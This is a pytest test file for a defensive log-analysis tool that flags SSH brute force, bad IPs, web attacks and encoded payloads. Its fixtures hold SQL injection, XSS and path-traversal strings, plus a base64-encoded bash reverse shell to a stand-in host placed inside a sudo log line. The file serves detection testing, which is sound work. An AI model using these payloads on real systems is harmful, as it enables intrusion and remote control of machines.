import base64

import pytest

from bluetriage.detectors import Analyzer, decode_base64_blobs
from bluetriage.intel import BadIPList
from bluetriage.log_parser import parse_line

FAILED = "Nov  9 03:11:{s:02d} web01 sshd[1]: Failed password for {user} from {ip} port 5{s:04d} ssh2"
ACCEPTED = "Nov  9 03:12:00 web01 sshd[2]: Accepted password for {user} from {ip} port 50000 ssh2"
WEB = '{ip} - - [09/Nov/2026:03:16:01 +0000] "GET {path} HTTP/1.1" 200 100 "-" "{ua}"'
BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"


def run(lines, bad_ips=None, threshold=5):
    analyzer = Analyzer(bad_ips, threshold)
    for no, line in enumerate(lines, 1):
        analyzer.feed(parse_line(line, no, "test.log"))
    return analyzer.finish()


def rules(result):
    return {(f.rule, f.ip) for f in result.findings}


def failures(ip, n, users=("root",)):
    return [FAILED.format(s=i, user=users[i % len(users)], ip=ip) for i in range(n)]


def test_brute_force_needs_threshold():
    assert rules(run(failures("203.0.113.5", 4))) == set()
    assert ("BRUTE_FORCE", "203.0.113.5") in rules(run(failures("203.0.113.5", 5)))


def test_password_spraying_is_named():
    result = run(failures("198.51.100.23", 6, users=("oracle", "test", "git")))
    assert result.findings[0].title == "SSH password spraying"


def test_successful_login_after_brute_force_is_critical():
    result = run(failures("203.0.113.5", 6) + [ACCEPTED.format(user="admin", ip="203.0.113.5")])
    compromise = [f for f in result.findings if f.rule == "COMPROMISE_SUSPECTED"]
    assert compromise and compromise[0].severity == "critical"
    assert result.ip_verdicts()[0]["verdict"] == "MALICIOUS"


def test_normal_login_with_typo_stays_clean():
    result = run(failures("192.168.1.25", 1) + [ACCEPTED.format(user="sysadmin", ip="192.168.1.25")])
    assert result.findings == []
    assert result.ip_verdicts()[0]["verdict"] == "CLEAN"


def test_blocklist_matches_single_ips_and_cidr_ranges():
    bad = BadIPList()
    bad.add_line("198.51.100.16/28   # botnet")
    bad.add_line("192.0.2.77 # scanner")
    bad.add_line("not-an-ip")
    lines = [WEB.format(ip=ip, path="/", ua=BROWSER) for ip in ("198.51.100.23", "198.51.100.40", "192.0.2.77")]
    found = rules(run(lines, bad))
    assert found == {("BAD_IP_MATCH", "198.51.100.23"), ("BAD_IP_MATCH", "192.0.2.77")}
    assert bad.invalid == [(0, "not-an-ip")]


@pytest.mark.parametrize("path, rule", [
    ("/p.php?id=1%27%20OR%20%271%27%3D%271", "SQL_INJECTION"),
    ("/p.php?id=1+AND+1=1", "SQL_INJECTION"),
    ("/p.php?id=1%20UNION%20ALL%20SELECT%20NULL,password%20FROM%20users", "SQL_INJECTION"),
    ("/p.php?id=1%20AND%20SLEEP(5)", "SQL_INJECTION"),
    ("/p.php?id=1;%20DROP%20TABLE%20users", "SQL_INJECTION"),
    ("/p.php?id=1%252527%2520OR%25201%253D1", "SQL_INJECTION"),  # triple-encoded
    ("/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "XSS"),
    ("/dl.php?file=..%2F..%2F..%2Fetc%2Fpasswd", "PATH_TRAVERSAL"),
])
def test_web_attack_signatures(path, rule):
    result = run([WEB.format(ip="203.0.113.50", path=path, ua=BROWSER)])
    assert (rule, "203.0.113.50") in rules(result)


@pytest.mark.parametrize("path", [
    "/", "/products.php?id=12", "/search?q=black+and+white+shoes", "/blog/union-station-review",
    "/static/app.3f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c.js", "/order?color=red&size=small",
])
def test_benign_requests_are_not_flagged(path):
    assert run([WEB.format(ip="192.0.2.10", path=path, ua=BROWSER)]).findings == []


def test_scanner_user_agent_is_counted_once_per_ip():
    lines = [WEB.format(ip="203.0.113.50", path="/", ua="sqlmap/1.8.11#stable")] * 3
    scanner = [f for f in run(lines).findings if f.rule == "SCANNER_USER_AGENT"]
    assert len(scanner) == 1 and scanner[0].count == 3


def test_base64_reverse_shell_and_hidden_c2_ip():
    line = ("Nov  9 03:14:22 web01 sudo:    admin : TTY=pts/1 ; COMMAND=/bin/bash -c echo "
            "YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuOTkvNDQ0NCAwPiYx | base64 -d | bash")
    result = run([line])
    payload = next(f for f in result.findings if f.rule == "BASE64_PAYLOAD")
    c2 = next(f for f in result.findings if f.rule == "C2_INDICATOR")
    assert payload.severity == "high" and "/dev/tcp/203.0.113.99" in payload.detail
    assert (c2.ip, c2.block) == ("203.0.113.99", "outbound")


def test_base64_ignores_hashes_fingerprints_and_words():
    noise = ("sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f "
             "SHA256:Su4WsgeKmBGbCkmnb6SDo2pV61hNFvG4R/kXSSR7+f4 /usr/local/lib/python3/site-packages "
             "internationalization")
    assert decode_base64_blobs(noise) == []


def test_harmless_base64_is_low_severity():
    result = run([WEB.format(ip="198.51.100.200", path="/account?s=eyJ1c2VyIjoiZGVtbyIsInJvbGUiOiJ1c2VyIn0",
                             ua=BROWSER)])
    assert [(f.rule, f.severity) for f in result.findings] == [("BASE64_PAYLOAD", "low")]


def test_base64_of_control_bytes_is_ignored():
    """Valid UTF-8 but unreadable (e.g. a binary protocol blob) must not be reported as a payload."""
    blob = base64.b64encode(bytes(range(1, 32)) * 2).decode()
    assert decode_base64_blobs(f"data={blob}") == []
